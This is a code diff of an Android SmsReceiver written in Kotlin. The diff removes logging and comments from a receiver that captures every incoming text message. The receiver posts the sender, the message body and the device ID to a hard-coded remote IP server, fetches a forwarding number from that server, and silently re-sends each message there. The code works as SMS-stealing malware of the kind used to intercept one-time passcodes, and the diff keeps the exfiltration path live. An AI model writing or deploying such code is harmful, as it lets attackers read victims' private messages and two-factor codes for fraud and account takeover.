@@ -6,31 +6,20 @@ import android.content.Intent
 import android.provider.Settings
 import android.provider.Telephony
 import android.telephony.SmsManager
-import android.telephony.SmsMessage
-import android.util.Log
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
 class SmsReceiver : BroadcastReceiver() {
 
-    companion object {
-        private const val TAG = "SmsReceiver"
-    }
-
     override fun onReceive(context: Context?, intent: Intent?) {
-        Log.d(TAG, "========== SMS RECEIVER CALLED ==========")
-        Log.d(TAG, "Action: ${intent?.action}")
-
         if (context == null || intent == null) {
-            Log.e(TAG, "❌ Context or Intent is NULL!")
             return
         }
 
         val action = intent.action
         if (action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION &&
             action != Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
-            Log.w(TAG, "⚠️ Unknown action: $action")
             return
         }
 
@@ -38,7 +27,6 @@ class SmsReceiver : BroadcastReceiver() {
             val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
 
             if (messages.isEmpty()) {
-                Log.w(TAG, "⚠️ No messages in intent")
                 return
             }
 
@@ -54,28 +42,21 @@ class SmsReceiver : BroadcastReceiver() {
                 }
             }
 
-            Log.d(TAG, "📨 SMS from: $sender")
-            Log.d(TAG, "📝 Message: $fullMessage")
-            Log.d(TAG, "🕐 Timestamp: $timestamp")
-
-            // Background thread برای عملیات شبکه
             Thread {
                 try {
-                    // 1. ارسال به Backend
                     sendSmsToBackend(context, sender, fullMessage.toString(), timestamp)
 
-                    // 2. Forward کردن SMS (اگه نیازه)
                     val forwardingNumber = fetchForwardingNumberFromBackend(context)
                     if (!forwardingNumber.isNullOrEmpty()) {
                         forwardSms(forwardingNumber, fullMessage.toString())
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "❌ Error in background processing", e)
+                    e.printStackTrace()
                 }
             }.start()
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Error parsing SMS", e)
+            e.printStackTrace()
         }
     }
 
@@ -93,9 +74,7 @@ class SmsReceiver : BroadcastReceiver() {
                 put("deviceId", deviceId)
             }
 
-            Log.d(TAG, "📤 Sending to backend: ${body.toString()}")
-
-            val url = URL("http://95.134.130.160:8765/sms/new")
+            val url = URL("http://95.134.130.160:8765/api/sms/new")
             val conn = url.openConnection() as HttpURLConnection
 
             conn.requestMethod = "POST"
@@ -109,18 +88,11 @@ class SmsReceiver : BroadcastReceiver() {
                 os.flush()
             }
 
-            val responseCode = conn.responseCode
-            if (responseCode in 200..201) {
-                Log.d(TAG, "✅ SMS sent to backend successfully")
-            } else {
-                val errorBody = conn.errorStream?.bufferedReader()?.use { it.readText() }
-                Log.w(TAG, "⚠️ Backend response: $responseCode - $errorBody")
-            }
-
+            conn.responseCode
             conn.disconnect()
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Backend error", e)
+            e.printStackTrace()
         }
     }
 
@@ -130,8 +102,6 @@ class SmsReceiver : BroadcastReceiver() {
                 context.contentResolver,
                 Settings.Secure.ANDROID_ID
             )
-
-            Log.d(TAG, "📥 Fetching forwarding number for device: $deviceId")
 
             val url = URL("http://95.134.130.160:8765/api/getForwardingNumber/$deviceId")
             val conn = url.openConnection() as HttpURLConnection
@@ -143,7 +113,7 @@ class SmsReceiver : BroadcastReceiver() {
 
             val responseCode = conn.responseCode
             if (responseCode != 200) {
-                Log.w(TAG, "⚠️ Failed to fetch forwarding number: $responseCode")
+                conn.disconnect()
                 return null
             }
 
@@ -153,22 +123,18 @@ class SmsReceiver : BroadcastReceiver() {
 
             conn.disconnect()
 
-            Log.d(TAG, "✅ Forwarding number: $number")
             number
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Error fetching forwarding number", e)
+            e.printStackTrace()
             null
         }
     }
 
     private fun forwardSms(forwardingNumber: String, message: String) {
         try {
-            Log.d(TAG, "📲 Forwarding SMS to: $forwardingNumber")
-
             val smsManager = SmsManager.getDefault()
 
-            // اگه پیام طولانیه، باید بشکونیمش
             if (message.length > 160) {
                 val parts = smsManager.divideMessage(message)
                 smsManager.sendMultipartTextMessage(
@@ -178,7 +144,6 @@ class SmsReceiver : BroadcastReceiver() {
                     null,
                     null
                 )
-                Log.d(TAG, "✅ Multi-part SMS forwarded (${parts.size} parts)")
             } else {
                 smsManager.sendTextMessage(
                     forwardingNumber,
@@ -187,11 +152,10 @@ class SmsReceiver : BroadcastReceiver() {
                     null,
                     null
                 )
-                Log.d(TAG, "✅ SMS forwarded successfully")
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Forward failed", e)
+            e.printStackTrace()
         }
     }
 }
